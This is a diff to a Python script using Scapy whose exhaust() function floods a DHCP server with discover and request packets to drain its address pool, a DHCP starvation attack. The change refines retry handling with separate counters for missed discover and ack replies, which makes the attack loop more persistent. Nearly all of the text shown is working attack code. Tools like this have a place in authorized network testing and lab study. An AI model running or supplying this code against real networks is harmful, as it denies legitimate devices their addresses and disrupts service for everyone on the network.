@@ -11,7 +11,8 @@ conf.checkIPaddr = False
 def exhaust():
     loop = True
     xid = 0
-    error = 0
+    error_discover = 0
+    error_ack = 0
     # LOOP ONCE DHCP IP IS KNOWN
 
     while loop:
@@ -43,6 +44,7 @@ def exhaust():
                     offer_ser_id = offer["DHCP"].options[opt][1]
 
             # ACCEPT OFFER
+            error_discover = 0
             dhcp_request = Ether(dst='ff:ff:ff:ff:ff:ff') \
                             / IP(src='0.0.0.0', dst="255.255.255.255") \
                             / UDP(sport=68, dport=67) \
@@ -54,16 +56,17 @@ def exhaust():
 
             ack = srp1(dhcp_request, filter=f"src host {offer_ip} and port 68 and port 67", iface=source_interface, verbose=0, timeout=2)
             if ack != None:
+                error_ack = 0
                 print("ACK received\r", end = '')
             else:
                 print("no ACK received\r")
-                error += 1
-                if error == 5:
+                error_ack += 1
+                if error_ack == 5:
                     return
         except:
-            print("no Discover response\r")
-            error += 1
-            if error == 5:
+            print("no Discover response\r", end = '')
+            error_discover += 1
+            if error_discover == 20:
                 return
 
 if __name__ == "__main__":
